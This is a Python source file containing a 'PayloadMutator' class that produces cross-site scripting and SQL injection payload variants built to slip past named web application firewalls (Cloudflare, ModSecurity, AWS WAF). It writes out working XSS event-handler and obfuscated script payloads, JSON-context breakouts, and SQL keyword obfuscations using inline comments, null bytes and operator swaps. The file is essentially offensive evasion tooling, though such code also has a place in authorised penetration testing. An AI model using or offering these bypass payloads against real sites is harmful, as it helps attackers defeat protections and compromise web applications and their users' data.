from __future__ import annotations

import urllib.parse
import json


class PayloadMutator:
    """Generates context-aware and WAF-specific bypass payloads."""

    @staticmethod
    def mutate_xss(payload: str, context: str = "url", waf: str = "None") -> list:
        base_mutations = []

        # Context-specific base mutations
        if context == "json":
            # Break out of JSON string context
            base_mutations = [
                payload.replace('"', r'\"'),
                f'"}}{payload}{{"',  # Fixed escaped braces in f-string
                payload.replace("<", "\\u003c"),
            ]

        elif context == "url":
            base_mutations = [
                payload,
                urllib.parse.quote(payload),
                payload.replace("<", "%3C").replace(">", "%3E"),
            ]

        else:
            base_mutations = [payload]

        # WAF-specific evasion logic
        if waf == "Cloudflare":
            # Cloudflare often blocks <script, use SVG/IMG handlers instead
            waf_bypasses = [
                "<svg/onload=alert(1)>",
                "<img src=x onerror=alert(1)>",
                "<details/open/ontoggle=alert(1)>",
            ]
            base_mutations.extend(waf_bypasses)

        elif waf == "ModSecurity":
            # ModSecurity often blocks "alert", use prompt/confirm or obfuscation
            base_mutations.extend(
                [
                    "<script>prompt(1)</script>",
                    "<ScRiPt>confirm(1)</ScRiPt>",
                    "<script>window['al'+'ert'](1)</script>",
                ]
            )

        # Remove duplicates while preserving order
        return list(dict.fromkeys(base_mutations))

    @staticmethod
    def mutate_sqli(payload: str, context: str = "url", waf: str = "None") -> list:
        base_mutations = [
            payload,
            payload.replace("UNION", "UN/**/ION"),      # Inline comment
            payload.replace(" ", "/**/"),               # Space replacement
            payload.replace("SELECT", "SELE%00CT"),     # Null-byte obfuscation
        ]

        if waf == "AWS WAF":
            # AWS WAF often blocks OR 1=1, use alternative expressions
            base_mutations.extend(
                [
                    payload.replace("1=1", "1 LIKE 1"),
                    payload.replace("OR", "||"),
                    payload.replace("UNION SELECT", "UNION ALL SELECT"),
                ]
            )

        # Remove duplicates while preserving order
        return list(dict.fromkeys(base_mutations))